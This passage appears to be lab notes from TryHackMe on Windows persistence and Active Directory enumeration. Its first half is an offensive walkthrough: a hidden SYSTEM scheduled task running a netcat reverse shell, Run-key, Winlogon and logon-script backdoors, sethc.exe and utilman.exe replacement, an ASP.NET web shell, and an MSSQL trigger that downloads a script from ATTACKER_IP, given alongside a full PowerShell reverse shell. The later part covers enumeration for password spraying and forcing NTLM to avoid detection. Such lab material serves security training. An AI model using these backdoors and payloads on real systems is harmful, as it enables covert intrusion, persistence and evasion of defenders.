The previous command will create a "THM-TaskBackdoor" task and execute an nc64 reverse shell back to the attacker. The /sc and /mo options indicate that the task should be run every single minute. The /ru option indicates that the task will run with SYSTEM privileges.

To check if our task was successfully created, we can use the following command:
![image](https://user-images.githubusercontent.com/24814781/188331528-57910186-11ad-42b0-9ef0-87772a30223d.png)

### Making Our Task Invisible

Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable. To further hide our scheduled task, we can make it invisible to any user in the system by deleting its Security Descriptor (SD). The security descriptor is simply an ACL that states which users have access to the scheduled task. If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use. Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.

The security descriptors of all scheduled tasks are stored in HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\. You will find a registry key for every task, under which a value named "SD" contains the security descriptor. You can only erase the value if you hold SYSTEM privileges.

To hide our task, let's delete the SD value for the "THM-TaskBackdoor" task we created before. To do so, we will use psexec (available in C:\tools) to open Regedit with SYSTEM privileges:
![image](https://user-images.githubusercontent.com/24814781/188331704-eb03198d-39a6-4474-bb75-18c9a6f72df0.png)


We will then delete the security descriptor for our task:
![image](https://user-images.githubusercontent.com/24814781/188331694-4c005a85-4ff6-4bab-9b87-2fb9c2bbebe3.png)


If we try to query our service again, the system will tell us there is no such task:
![image](https://user-images.githubusercontent.com/24814781/188331730-faff0ae7-cf47-4ada-8f5e-b8459dc09b24.png)

If we start an nc listener in our attacker's machine, we should get a shell back after a minute:
![image](https://user-images.githubusercontent.com/24814781/188331756-5f7ec58e-97ee-4666-9813-d1e3c549ff27.png)

### Logon Triggered Persistence
Some actions performed by a user might also be bound to executing specific payloads for persistence. Windows operating systems present several ways to link payloads with particular interactions. This task will look at ways to plant payloads that will get executed when a user logs into the system.

### Startup folder

Each user has a folder under C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup where you can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there. Notice that each user will only run whatever is available in their folder.

If we want to force all users to run a payload while logging in, we can use the folder under C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp in the same way.

For this task, let's generate a reverse shell payload using msfvenom:
![image](https://user-images.githubusercontent.com/24814781/188331900-7a676c61-b127-4350-b590-69155fe4f0d2.png)

We will then copy our payload into the victim machine. You can spawn an http.server with Python3 and use wget on the victim machine to pull your file:
![image](https://user-images.githubusercontent.com/24814781/188331923-c43a90b2-ddf7-420b-9b93-8402c0d46b0a.png)

We then store the payload into the C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp folder to get a shell back for any user logging into the machine.

![image](https://user-images.githubusercontent.com/24814781/188331939-3fdf4cf6-23be-477a-8272-df7b287b0372.png)

Now be sure to sign out of your session from the start menu (closing the RDP window is not enough as it leaves your session open):

![image](https://user-images.githubusercontent.com/24814781/188331944-0992b644-0b57-4920-a916-7e9346a9259e.png)

And log back via RDP. You should immediately receive a connection back to your attacker's machine.

### Run / RunOnce

You can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:

*    HKCU\Software\Microsoft\Windows\CurrentVersion\Run
*    HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
*    HKLM\Software\Microsoft\Windows\CurrentVersion\Run
*    HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

The registry entries under HKCU will only apply to the current user, and those under HKLM will apply to everyone. Any program specified under the Run keys will run every time the user logs on. Programs specified under the RunOnce keys will only be executed a single time.

For this task, let's create a new reverse shell with msfvenom:
![image](https://user-images.githubusercontent.com/24814781/188332919-6b88bcde-de7f-4793-8108-3b60f93c66a7.png)

After transferring it to the victim machine, let's move it to C:\Windows\:
![image](https://user-images.githubusercontent.com/24814781/188332927-117e4384-d2ad-4791-a4bd-d22824fce5b7.png)

Let's then create a REG_EXPAND_SZ registry entry under HKLM\Software\Microsoft\Windows\CurrentVersion\Run. The entry's name can be anything you like, and the value will be the command we want to execute.

Note: While in a real-world set-up you could use any name for your registry entry, for this task you are required to use MyBackdoor to receive the flag.

![image](https://user-images.githubusercontent.com/24814781/188332932-66fa2bb6-95c9-41b9-8ef4-0e0197ab3b45.png)


After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10-20 seconds).


### Winlogon

Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads your user profile right after authentication (amongst other things).

Winlogon uses some registry keys under HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ that could be interesting to gain persistence:

*    Userinit points to userinit.exe, which is in charge of restoring your user profile preferences.
*    shell points to the system's shell, which is usually explorer.exe.

![image](https://user-images.githubusercontent.com/24814781/188332947-5075430e-5911-4429-8ad8-ee3e73ef545c.png)

If we'd replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired. Interestingly, you can append commands separated by a comma, and Winlogon will process them all.

Let's start by creating a shell:
![image](https://user-images.githubusercontent.com/24814781/188332996-7f3c9047-bca1-4a5b-9f91-a03c7cdab413.png)

We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use C:\Windows:

![image](https://user-images.githubusercontent.com/24814781/188333004-4b6a4ae4-f4d9-4cc2-8307-622461361ba2.png)

We then alter either shell or Userinit in HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\. In this case we will use Userinit, but the procedure with shell is the same.

![image](https://user-images.githubusercontent.com/24814781/188333054-00292966-199b-4931-8b86-a6df05bd750f.png)


### Logon scripts

One of the things userinit.exe does while loading your user profile is to check for an environment variable called UserInitMprLogonScript. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.

Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.

Let's first create a reverse shell to use for this technique:
![image](https://user-images.githubusercontent.com/24814781/188333227-823869f4-1385-45c3-8125-b51158fd89bf.png)

We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use C:\Windows:
![image](https://user-images.githubusercontent.com/24814781/188333231-20967737-45b9-4fc7-9c45-673d38ecbfbc.png)

To create an environment variable for a user, you can go to its HKCU\Environment in the registry. We will use the UserInitMprLogonScript entry to point to our payload so it gets loaded when the users logs in:
![image](https://user-images.githubusercontent.com/24814781/188333237-eff3d6e0-6a2d-4d84-897d-e331a16f840d.png)

Notice that this registry key has no equivalent in HKLM, making your backdoor apply to the current user only.

After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).


### Backdooring the Login Screen and RDP
If we have physical access to the machine (or RDP in our case), you can backdoor the login screen to access a terminal without having valid credentials for a machine.

We will look at two methods that rely on accessibility features to this end.

### Sticky Keys

When pressing key combinations like CTRL + ALT + DEL, you can configure Windows to use sticky keys, which allows you to press the buttons of a combination sequentially instead of at the same time. In that sense, if sticky keys are active, you could press and release CTRL, press and release ALT and finally, press and release DEL to achieve the same effect as pressing the CTRL + ALT + DEL combination.

To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing SHIFT 5 times. After inputting the shortcut, we should usually be presented with a screen that looks as follows:
![image](https://user-images.githubusercontent.com/24814781/188505118-bf3af81d-92dd-4614-aa93-710899042e82.png)

After pressing SHIFT 5 times, Windows will execute the binary in C:\Windows\System32\sethc.exe. If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.

A straightforward way to backdoor the login screen consists of replacing sethc.exe with a copy of cmd.exe. That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.

To overwrite sethc.exe, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy of cmd.exe. We can do so with the following commands:
![image](https://user-images.githubusercontent.com/24814781/188505149-519cc2ad-52d5-4415-bc06-fe5c2c6ba3fe.png)

After doing so, lock your session from the start menu:
![image](https://user-images.githubusercontent.com/24814781/188505163-41b580ee-7cbc-4cca-8054-d47a2305b1c0.png)

You should now be able to press SHIFT five times to access a terminal with SYSTEM privileges directly from the login screen:
![image](https://user-images.githubusercontent.com/24814781/188505212-4013d470-38c8-4bea-bbb8-4b63d2260fbc.png)

### Utilman

Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:
![image](https://user-images.githubusercontent.com/24814781/188505303-782d7bd0-e406-4171-8659-8719bddb7d71.png)

When we click the ease of access button on the login screen, it executes C:\Windows\System32\Utilman.exe with SYSTEM privileges. If we replace it with a copy of cmd.exe, we can bypass the login screen again.

To replace utilman.exe, we do a similar process to what we did with sethc.exe:
![image](https://user-images.githubusercontent.com/24814781/188505323-13989ec6-9e8a-4b54-b8c4-b9ac71ca65b6.png)

To trigger our terminal, we will lock our screen from the start button:
![image](https://user-images.githubusercontent.com/24814781/188505338-f065d3e1-fd21-4a83-bc74-20cbc47f10c4.png)

And finally, proceed to click on the "Ease of Access" button. Since we replaced utilman.exe with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:
![image](https://user-images.githubusercontent.com/24814781/188505352-f18a0811-442a-4e7b-a99f-dec0cb87655d.png)

### Persisting Through Existing Services
If you don't want to use Windows features to hide a backdoor, you can always profit from any existing service that can be used to run code for you. This task will look at how to plant backdoors in a typical web server setup. Still, any other application where you have some degree of control on what gets executed should be backdoorable similarly. The possibilities are endless!

### Using Web Shells

The usual way of achieving persistence in a web server is by uploading a web shell to the web directory. This is trivial and will grant us access with the privileges of the configured user in IIS, which by default is iis apppool\defaultapppool. Even if this is an unprivileged user, it has the special SeImpersonatePrivilege, providing an easy way to escalate to the Administrator using various known exploits. 

Let's start by downloading an ASP.NET web shell. A ready to use web shell is provided here,
```
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
```
but feel free to use any you prefer. Transfer it to the victim machine and move it into the webroot, which by default is located in the C:\inetpub\wwwroot directory:
![image](https://user-images.githubusercontent.com/24814781/188505972-18337cbb-6daa-49db-a09e-76045afe4b55.png)

We can then run commands from the web server by pointing to the following URL:

http://10.10.234.126/shell.aspx

![image](https://user-images.githubusercontent.com/24814781/188505980-52ddb308-933f-48ba-b8d3-6e965ca8d032.png)

While web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Any change to a file in there will probably trigger an alert.


### Using MSSQL as a Backdoor

There are several ways to plant backdoors in MSSQL Server installations. For now, we will look at one of them that abuses triggers. Simply put, triggers in MSSQL allow you to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. For this task, we will create a trigger for any INSERT into the HRDB database.

Before creating the trigger, we must first reconfigure a few things on the database. First, we need to enable the xp_cmdshell stored procedure. xp_cmdshell is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes disabled by default.

To enable it, let's open Microsoft SQL Server Management Studio 18, available from the start menu. When asked for authentication, just use Windows Authentication (the default value), and you will be logged on with the credentials of your current Windows User. By default, the local Administrator account will have access to all DBs.

Once logged in, click on the New Query button to open the query editor:
![image](https://user-images.githubusercontent.com/24814781/188506022-c51c73cc-6288-4bf7-bc9b-20bf9fb15ad1.png)

Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable xp_cmdshell.

```
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```
After this, we must ensure that any website accessing the database can run xp_cmdshell. By default, only database users with the sysadmin role will be able to do so. Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the sa user, which is the default database administrator:
```
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

After all of this, we finally configure a trigger. We start by changing to the HRDB database:
```
USE HRDB
```

Our trigger will leverage xp_cmdshell to execute Powershell to download and run a .ps1 file from a web server controlled by the attacker. The trigger will be configured to execute whenever an INSERT is made into the Employees table of the HRDB database:

```
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```


Now that the backdoor is set up, let's create evilscript.ps1 in our attacker's machine, which will contain a Powershell reverse shell:

```
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

We will need to open two terminals to handle the connections involved in this exploit:

*    The trigger will perform the first connection to download and execute evilscript.ps1. Our trigger is using port 8000 for that.
*    The second connection will be a reverse shell on port 4454 back to our attacker machine.

![image](https://user-images.githubusercontent.com/24814781/188506147-d265ae97-f1df-403e-83e3-1004e10f73b2.png)

With all that ready, let's navigate to http://10.10.234.126/ and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.

-------------------------------------------------------------------------------------------------------------------


-------------------------------------------------------------------------------------
### Basic AD machine Enumeration
## OBS: the examples here is done in tryhackme ofc you will change some parts like domain etc but you probably know that ;)

### Credential Injection

#### Runas Explained

Have you ever found AD credentials but nowhere to log in with them? Runas may be the answer you've been looking for!

In security assessments, you will often have network access and have just discovered AD credentials but have no means or privileges to create a new domain-joined machine. So we need the ability to use those credentials on a Windows machine we control.

If we have the AD credentials in the format of <username>:<password>, we can use Runas, a legitimate Windows binary, to inject the credentials into memory. The usual Runas command would look something like this:
```
runas.exe /netonly /user:<domain>\<username> cmd.exe
```
Let's look at the parameters:

*    /netonly - Since we are not domain-joined, we want to load the credentials for network authentication but not authenticate against a domain controller. So commands executed locally on the computer will run in the context of your standard Windows account, but any network connections will occur using the account specified here.
*    /user - Here, we provide the details of the domain and the username. It is always a safe bet to use the Fully Qualified Domain Name (FQDN) instead of just the NetBIOS name of the domain since this will help with resolution.
*    cmd.exe - This is the program we want to execute once the credentials are injected. This can be changed to anything, but the safest bet is cmd.exe since you can then use that to launch whatever you want, with the credentials injected.

Once you run this command, you will be prompted to supply a password. Note that since we added the /netonly parameter, the credentials will not be verified directly by a domain controller so that it will accept any password. We still need to confirm that the network credentials are loaded successfully and correctly.

Note: If you use your own Windows machine, you should make sure that you run your first Command Prompt as Administrator. This will inject an Administrator token into CMD. If you run tools that require local Administrative privileges from your Runas spawned CMD, the token will already be available. This does not give you administrative privileges on the network, but will ensure that any local commands you execute, will execute with administrative privileges.


#### It's Always DNS

Note: These next steps you only need to perform if you use your own Windows machine for the exercise. However, it is good knowledge to learn how to perform since it may be helpful on red team exercises.

After providing the password, a new command prompt window will open. Now we still need to verify that our credentials are working. The most surefire way to do this is to list SYSVOL. Any AD account, no matter how low-privileged, can read the contents of the SYSVOL directory.

SYSVOL is a folder that exists on all domain controllers. It is a shared folder storing the Group Policy Objects (GPOs) and information along with any other domain related scripts. It is an essential component for Active Directory since it delivers these GPOs to all computers on the domain. Domain-joined computers can then read these GPOs and apply the applicable ones, making domain-wide configuration changes from a central location.

Before we can list SYSVOL, we need to configure our DNS. Sometimes you are lucky, and internal DNS will be configured for you automatically through DHCP or the VPN connection, but not always (like this TryHackMe network). It is good to understand how to do it manually. Your safest bet for a DNS server is usually a domain controller. Using the IP of the domain controller, we can execute the following commands in a PowerShell window:

```
$dnsip = "<DC IP>"
$index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
```

Of course, 'Ethernet' will be whatever interface is connected to the TryHackMe network. We can verify that DNS is working by running the following:
```
C:\> nslookup za.tryhackme.com
```
Which should now resolve to the DC IP since this is where the FQDN is being hosted. Now that DNS is working, we can finally test our credentials. We can use the following command to force a network-based listing of the SYSVOL directory:
```
C:\Tools>dir \\za.tryhackme.com\SYSVOL\
 Volume in drive \\za.tryhackme.com\SYSVOL is Windows
 Volume Serial Number is 1634-22A9

 Directory of \\za.tryhackme.com\SYSVOL

02/24/2022  09:57 PM    <DIR>          .
02/24/2022  09:57 PM    <DIR>          ..
02/24/2022  09:57 PM    <JUNCTION>     za.tryhackme.com [C:\Windows\SYSVOL\domain]
               0 File(s)              0 bytes
               3 Dir(s)  51,835,408,384 bytes free
```

We won't go too much in-depth now into the contents of SYSVOL, but note that it is also good to enumerate its contents since there may be some additional AD credentials lurking there.

#### IP vs Hostnames

Question: Is there a difference between dir \\za.tryhackme.com\SYSVOL and dir \\<DC IP>\SYSVOL and why the big fuss about DNS?

There is quite a difference, and it boils down to the authentication method being used. When we provide the hostname, network authentication will attempt first to perform Kerberos authentication. Since Kerberos authentication uses hostnames embedded in the tickets, if we provide the IP instead, we can force the authentication type to be NTLM. While on the surface, this does not matter to us right now, it is good to understand these slight differences since they can allow you to remain more stealthy during a Red team assessment. In some instances, organisations will be monitoring for OverPass- and Pass-The-Hash Attacks. Forcing NTLM authentication is a good trick to have in the book to avoid detection in these cases.

Using Injected Credentials

Now that we have injected our AD credentials into memory, this is where the fun begins. With the /netonly option, all network communication will use these injected credentials for authentication. This includes all network communications of applications executed from that command prompt window.

This is where it becomes potent. Have you ever had a case where an MS SQL database used Windows Authentication, and you were not domain-joined? Start MS SQL Studio from that command prompt; even though it shows your local username, click Log In, and it will use the AD credentials in the background to authenticate! We can even use this to:
```
https://labs.withsecure.com/blog/pth-attacks-against-ntlm-authenticated-web-applications/
```

### Enumeration through Microsoft Management Console

#### Microsoft Management Console

In this task, we will explore our first enumeration method, which is the only method that makes use of a GUI until the very last task. We will be using the Microsoft Management Console (MMC) with the Remote Server Administration Tools' (RSAT)
```
https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps
```
 AD Snap-Ins. 

You can start MMC by using the Windows Start button, searching run, and typing in MMC. If we just run MMC normally, it would not work as our computer is not domain-joined, and our local account cannot be used to authenticate to the domain. 

![image](https://user-images.githubusercontent.com/24814781/187780213-edd87dc2-8a10-44ff-a2e7-bbb78b5b1cf9.png)

This is where the Runas window from the previous task comes into play. In that window, we can start MMC, which will ensure that all MMC network connections will use our injected AD credentials.

In MMC, we can now attach the AD RSAT Snap-In:

1.     Click File -> Add/Remove Snap-in
3.     Select and Add all three Active Directory Snap-ins
4.     Click through any errors and warnings
5.     Right-click on Active Directory Domains and Trusts and select Change Forest
6.     Enter za.tryhackme.com as the Root domain and Click OK
7.     Right-click on Active Directory Sites and Services and select Change Forest
8.     Enter za.tryhackme.com as the Root domain and Click OK
9.     Right-click on Active Directory Users and Computers and select Change Domain
10.    Enter za.tryhackme.com as the Domain and Click OK
11.    Right-click on Active Directory Users and Computers in the left-hand pane
12.    Click on View -> Advanced Features

If everything up to this point worked correctly, your MMC should now be pointed to, and authenticated against, the target Domain:

![image](https://user-images.githubusercontent.com/24814781/187780815-b9158028-d7c4-485c-b81e-c04c3921257e.png)

We can now start enumerating information about the AD structure here. 
  
#### Users and Computers

Let's take a look at the Active Directory structure. For this task, we will focus on AD Users and Computers. Expand that snap-in and expand the za domain to see the initial Organisational Unit (OU) structure:
![image](https://user-images.githubusercontent.com/24814781/187781726-cca93835-b908-4532-874b-8f12a3462bcf.png)

Let's take a look at the People directory. Here we see that the users are divided according to department OUs. Clicking on each of these OUs will show the users that belong to that department.
![image](https://user-images.githubusercontent.com/24814781/187781828-cca90ad7-055e-4258-a16e-699d32abe249.png)

Clicking on any of these users will allow us to review all of their properties and attributes. We can also see what groups they are a member of:
![image](https://user-images.githubusercontent.com/24814781/187782097-6adaf741-f156-48c2-82c1-a862cdc47bf2.png)

We can also use MMC to find hosts in the environment. If we click on either Servers or Workstations, the list of domain-joined machines will be displayed.
![image](https://user-images.githubusercontent.com/24814781/187782141-0ab7c283-eb5c-46fb-b290-3823a0801f59.png)


If we had the relevant permissions, we could also use MMC to directly make changes to AD, such as changing the user's password or adding an account to a specific group. Play around with MMC to better understand the AD domain structure. Make use of the search feature to look for objects.
  
#### Benefits

*    The GUI provides an excellent method to gain a holistic view of the AD environment.
*    Rapid searching of different AD objects can be performed.
*    It provides a direct method to view specific updates of AD objects.
*    If we have sufficient privileges, we can directly update existing AD objects or add new ones.

#### Drawbacks

*    The GUI requires RDP access to the machine where it is executed.
*    Although searching for an object is fast, gathering AD wide properties or attributes cannot be performed.


### Enumeration through Command Prompt
#### Command Prompt

There are times when you just need to perform a quick and dirty AD lookup, and Command Prompt has your back. Good ol' reliable CMD is handy when you perhaps don't have RDP access to a system, defenders are monitoring for PowerShell use, and you need to perform your AD Enumeration through a Remote Access Trojan (RAT). It can even be helpful to embed a couple of simple AD enumeration commands in your phishing payload to help you gain the vital information that can help you stage the final attack.

CMD has a built-in command that we can use to enumerate information about AD, namely net. The net command is a handy tool to enumerate information about the local system and AD. We will look at a couple of interesting things we can enumerate from this position, but this is not an exhaustive list.

#### Users

We can use the net command to list all users in the AD domain by using the user sub-option:
```
C:\>net user /domain
The request will be processed at a domain controller for domain za.tryhackme.com

User accounts for \\THMDC

-------------------------------------------------------------------------------
aaron.conway             aaron.hancock            aaron.harris
aaron.johnson            aaron.lewis              aaron.moore
aaron.patel              aaron.smith              abbie.joyce
abbie.robertson          abbie.taylor             abbie.walker
abdul.akhtar             abdul.bates              abdul.holt
abdul.jones              abdul.wall               abdul.west
abdul.wilson             abigail.cox              abigail.cox1
abigail.smith            abigail.ward             abigail.wheeler
[....]
The command completed successfully.
```

This will return all AD users for us and can be helpful in determining the size of the domain to stage further attacks. We can also use this sub-option to enumerate more detailed information about a single user account:

```
C:\>net user zoe.marshall /domain
The request will be processed at a domain controller for domain za.tryhackme.com

User name                    zoe.marshall
Full Name                    Zoe Marshall
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/24/2022 10:06:06 PM
Password expires             Never
Password changeable          2/24/2022 10:06:06 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Internet Access
The command completed successfully.
```

Note: If the user is only part of a small number of AD groups, this command will be able to show us group memberships. However, usually, after more than ten group memberships, the command will fail to list them all.

#### Groups

We can use the net command to enumerate the groups of the domain by using the group sub-option:
```
C:\>net group /domain
The request will be processed at a domain controller for domain za.tryhackme.com

Group Accounts for \\THMDC

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
[...]
*Schema Admins
*Server Admins
*Tier 0 Admins
*Tier 1 Admins
*Tier 2 Admins
The command completed successfully.
```

This information can help us find specific groups to target for goal execution. We could also enumerate more details such as membership to a group by specifying the group in the same command:
```
C:\>net group "Tier 1 Admins" /domain
The request will be processed at a domain controller for domain za.tryhackme.com

Group name     Tier 1 Admins
Comment

Members

-------------------------------------------------------------------------------
t1_arthur.tyler          t1_gary.moss             t1_henry.miller
t1_jill.wallis           t1_joel.stephenson       t1_marian.yates
t1_rosie.bryant
The command completed successfully.
```

#### Password Policy

We can use the net command to enumerate the password policy of the domain by using the accounts sub-option:

```
C:\>net accounts /domain
The request will be processed at a domain controller for domain za.tryhackme.com

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          Unlimited
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        PRIMARY
The command completed successfully.
```
This will provide us with helpful information such as:

    Length of password history kept. Meaning how many unique passwords must the user provide before they can reuse an old password.
    The lockout threshold for incorrect password attempts and for how long the account will be locked.
    The minimum length of the password.
    The maximum age that passwords are allowed to reach indicating if passwords have to be rotated at a regular interval.

This information can benefit us if we want to stage additional password spraying attacks against the other user accounts that we have now enumerated. It can help us better guess what single passwords we should use in the attack and how many attacks can we run before we risk locking accounts. However, it should be noted that if we perform a blind password spraying attack, we may lock out accounts anyway since we did not check to determine how many attempts that specific account had left before being locked.

You can find the full range of options associated with the net command here.
```
https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems
```
Play around with these net commands to gather information about specific users and groups.

  
Benefits

*    No additional or external tooling is required, and these simple commands are often not monitored for by the Blue team.
*    We do not need a GUI to do this enumeration.
*    VBScript and other macro languages that are often used for phishing payloads support these commands natively so they can be used to enumerate initial information regarding the AD domain before more specific payloads are crafted.

Drawbacks

*    The net commands must be executed from a domain-joined machine. If the machine is not domain-joined, it will default to the WORKGROUP domain.
*    The net commands may not show all information. For example, if a user is a member of more than ten groups, not all of these groups will be shown in the output.

  
### Enumeration through PowerShell
#### PowerShell

PowerShell is the upgrade of Command Prompt. Microsoft first released it in 2006. While PowerShell has all the standard functionality Command Prompt provides, it also provides access to cmdlets (pronounced command-lets), which are .NET classes to perform specific functions. While we can write our own cmdlets, like the creators of PowerView
 ```
https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView
```
did, we can already get very far using the built-in ones.

There are 50+ cmdlets installed. We will be looking at some of these, but refer to this list for the complete list of cmdlets.
```
https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps
```

Using our SSH terminal (or rdp etc), we can upgrade it to a PowerShell terminal using the following command: powershell

#### Users

We can use the Get-ADUser cmdlet to enumerate AD users:
```
PS C:\> Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *

AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
[...]
Deleted                              :
Department                           : Consulting
Description                          :
DisplayName                          : Gordon Stevens
DistinguishedName                    : CN=gordon.stevens,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=com
[...]
```
The parameters are used for the following:

*    -Identity - The account name that we are enumerating
*    -Properties - Which properties associated with the account will be shown, * will show all properties
*    -Server - Since we are not domain-joined, we have to use this parameter to point it to our domain controller

For most of these cmdlets, we can also use the -Filter parameter that allows more control over enumeration and use the Format-Table cmdlet to display the results such as the following neatly:
```
PS C:\> Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A

Name             SamAccountName
----             --------------
chloe.stevens    chloe.stevens
samantha.stevens samantha.stevens
[...]
janice.stevens   janice.stevens
gordon.stevens   gordon.stevens
```
#### Groups

We can use the Get-ADGroup cmdlet to enumerate AD groups:
```
PS C:\> Get-ADGroup -Identity Administrators -Server za.tryhackme.com


DistinguishedName : CN=Administrators,CN=Builtin,DC=za,DC=tryhackme,DC=com
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : Administrators
ObjectClass       : group
ObjectGUID        : f4d1cbcd-4a6f-4531-8550-0394c3273c4f
SamAccountName    : Administrators
SID               : S-1-5-32-544
```
We can also enumerate group membership using the Get-ADGroupMember cmdlet:
```
PS C:\> Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com


distinguishedName : CN=Domain Admins,CN=Users,DC=za,DC=tryhackme,DC=com

name              : Domain Admins
objectClass       : group
objectGUID        : 8a6186e5-e20f-4f13-b1b0-067f3326f67c
SamAccountName    : Domain Admins
SID               : S-1-5-21-3330634377-1326264276-632209373-512

[...]

distinguishedName : CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=com name              : Administrator
objectClass       : user
objectGUID        : b10fe384-bcce-450b-85c8-218e3c79b30fSamAccountName    : Administrator
SID               : S-1-5-21-3330634377-1326264276-632209373-500
```
#### AD Objects

A more generic search for any AD objects can be performed using the Get-ADObject cmdlet. For example, if we are looking for all AD objects that were changed after a specific date:
```
PS C:\> $ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
PS C:\> Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com

Deleted           :
DistinguishedName : DC=za,DC=tryhackme,DC=com
Name              : za
ObjectClass       : domainDNS
ObjectGUID        : 518ee1e7-f427-4e91-a081-bb75e655ce7a

Deleted           :
DistinguishedName : CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=com
Name              : Administrator
ObjectClass       : user
ObjectGUID        : b10fe384-bcce-450b-85c8-218e3c79b30f
```
If we wanted to, for example, perform a password spraying attack without locking out accounts, we can use this to enumerate accounts that have a badPwdCount that is greater than 0, to avoid these accounts in our attack:
```
PS C:\> Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
PS C:\>
```
This will only show results if one of the users in the network mistyped their password a couple of times.

#### Domains

We can use Get-ADDomain to retrieve additional information about the specific domain:
```
PS C:\> Get-ADDomain -Server za.tryhackme.com

AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=za,DC=tryhackme,DC=com
DeletedObjectsContainer            : CN=Deleted Objects,DC=za,DC=tryhackme,DC=com
DistinguishedName                  : DC=za,DC=tryhackme,DC=com
DNSRoot                            : za.tryhackme.com
DomainControllersContainer         : OU=Domain Controllers,DC=za,DC=tryhackme,DC=com
[...]
UsersContainer                     : CN=Users,DC=za,DC=tryhackme,DC=com
```
#### Altering AD Objects

The great thing about the AD-RSAT cmdlets is that some even allow you to create new or alter existing AD objects. However, our focus for this network is on enumeration. Creating new objects or altering existing ones would be considered AD exploitation, which is covered later in the AD module.

However, we will show an example of this by force changing the password of our AD user by using the Set-ADAccountPassword cmdlet:
```
